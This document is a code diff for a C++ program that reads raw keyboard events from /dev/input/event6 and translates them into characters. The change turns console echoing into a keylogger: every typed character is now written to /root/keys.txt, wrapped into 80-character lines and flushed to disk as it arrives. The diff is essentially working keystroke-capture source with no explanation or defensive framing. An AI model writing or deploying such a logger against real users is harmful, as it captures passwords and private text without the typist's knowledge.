@@ -7,6 +7,7 @@
 #include <iostream>
 #include <vector>
 #include <ctime>
+#include <fstream>
 
 /**
  * Time:
@@ -30,7 +31,10 @@ struct input_event {
 
 using namespace std;
 
-#define FILENAME "/dev/input/event6"
+#define FILENAME		"/dev/input/event6"
+#define WHERE_TO_STORE		"/root/keys.txt"
+
+#define MAXIMUM_LINE_LENGTH	80
 
 vector<unsigned short> syns;		/* It stores signals */
 
@@ -122,17 +126,44 @@ delete_syn(unsigned short code)
 			syns.at(i) = 0;
 }
 
+bool
+store_in_file(fstream& fp_where_to_store, char ch)
+{
+	static unsigned short length = 0;
+	bool suc_or_fil = true;
+
+	if (!fp_where_to_store.is_open())
+		return false;
+	
+	fp_where_to_store << ch;
+
+	if (++length % MAXIMUM_LINE_LENGTH == 0)
+		fp_where_to_store << endl;
+	else
+		fp_where_to_store.flush();
+
+	return suc_or_fil;
+}
+
 int
 main(int argc, char *argv[])
 {
-	FILE  *fp;
-	struct input_event event;
-	char   ch;
+	FILE 	 *fp;
+	fstream   fp_where_to_store;
+	struct	  input_event event;
+	char	  ch;
 
 	fp = fopen(FILENAME, "rb");
+	fp_where_to_store.open(WHERE_TO_STORE, ifstream::out);
 
 	if (fp == nullptr) {
 		cout << "There was an error: Cannot open the file " << FILENAME << endl;
+		exit(1);
+	}
+
+	
+	if (!fp_where_to_store.good()) {
+		cout << "There was an error: cannot open the file " << WHERE_TO_STORE << endl;
 		exit(1);
 	}
 
@@ -154,10 +185,9 @@ main(int argc, char *argv[])
 					break;
 				case EV_KEY:
 					ch = get_typed_letter(event.code);
-					if (ch != '\0') {
-						cout << ch;
-						cout.flush();
-					}
+					if (ch != '\0')
+						if (!store_in_file(fp_where_to_store, ch))
+							cout << "There was an error" << endl;
 					break;
 				case EV_REL:
 					delete_syn(event.code);
